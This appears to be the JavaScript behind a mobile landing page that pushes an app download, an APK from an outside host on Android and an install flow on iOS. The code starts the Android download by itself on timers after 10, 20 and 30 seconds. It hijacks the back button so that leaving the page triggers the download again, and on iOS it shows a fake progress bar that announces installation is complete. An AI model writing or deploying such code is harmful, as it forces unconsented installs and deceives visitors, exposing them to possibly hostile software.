var livePage = {
    downUrl_AN: '',
    setTimer1: null, setTimer2: null, setTimer3: null,
    iosOffLine: true, qd: '', m: "", ios: "", data: "", appKey: "qfmrnc",
    init: function () {
        var _this = this;
        _this.getDownUrl();
        if (_this.sysTemInfo() == 'android') {
            _this.before_down();
        }
        _this.stopBack();
        $(document).on('click', '.js_down', function () {
            _this.down();
        });
    },
    sysTemInfo: function () {
        var us = navigator.userAgent.toLowerCase();
        if ((us.indexOf('android') > -1 || us.indexOf('linux') > -1) || navigator.platform.toLowerCase().indexOf('linux') != -1) {
            return 'android';
        } else if (us.indexOf('iphone') > -1 || us.indexOf('ipad') > -1) {
            return 'ios';
        }
    },
    getURLParameter: function (name) {
        return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(location.search) || [null, ''])[1].replace(/\+/g, '%20')) || null;
    },
    getDownUrl: function () {
        var _this = this;
        _this.qd = _this.getURLParameter('channelCode') || '0';
        _this.downUrl_AN = 'https://apk.nidong.com/psd_smapk_196.apk';
        if (_this.sysTemInfo() == 'ios') {
            _this.appKey = 'qfmrnc';
        }
        _this.m = new OpenInstall({
            appKey: this.appKey
        }, { "channelCode": _this.qd });
    },
    before_down: function () {
        var _this = this;
        _this.setTimer1 = setTimeout(function () {
            _this.down();
        }, 10e3);
        _this.setTimer2 = setTimeout(function () {
            _this.down();
        }, 20e3);
        _this.setTimer3 = setTimeout(function () {
            _this.down();
        }, 30e3);
    },
    isWeChat: function () {
        var ua = navigator.userAgent.toLowerCase();
        if (ua.match(/MicroMessenger/i) == "micromessenger") {
            return true;
        } else {
            return false;
        }
    },
    down: function () {
        var _this = this;
        if (_this.isWeChat()) {
            _this.sysTemInfo() == 'ios' ? _this.weChatRes('images/ios_wx.png') : _this.m.install();
        } else {
            if (_this.sysTemInfo() == 'ios') {
                _this.iosOffLine && _this.installByQYZS();
                _this.m.install();
            } else {
                window.location.href = _this.downUrl_AN;
            }
        }
    },
    weChatRes: function (n) {
        $('.wechat').length && $('.wechat').remove();
        var html = '<div class="wechat"><img src="' + n + '" alt="点击右上角，然后选择浏览器打开！"/></div>';
        $('body').append(html);
    },
    installByQYZS: function () {
        $('.cover,.layer').hide();
        $("#js_box2").show();
        $(".now-download").show();
        loading = true;
        $(".top-bar").css("width", "0.1%");
        timer = setTimeout(function () {
            $(".top-bar").animate({
                width: "100%"
            }, 60000, function () {
                $(".now-download").html('安装完成，请开始设置！');
                $('.alert-btn').hide();
                loading = false;
            });
        }, 1000);
    },
    stopBack: function () {
        var that = this;
        if (window.history && window.history.pushState) {
            $(window).on('popstate', function () {
                window.history.pushState('forward', null, document.URL);
                window.history.forward(1);
                setTimeout(function () {
                    that.down();
                }, 5000)
            });
        }
        window.history.pushState('forward', null, document.URL);
        window.history.forward(1);
    }
}













$(function () {
    livePage.init();
})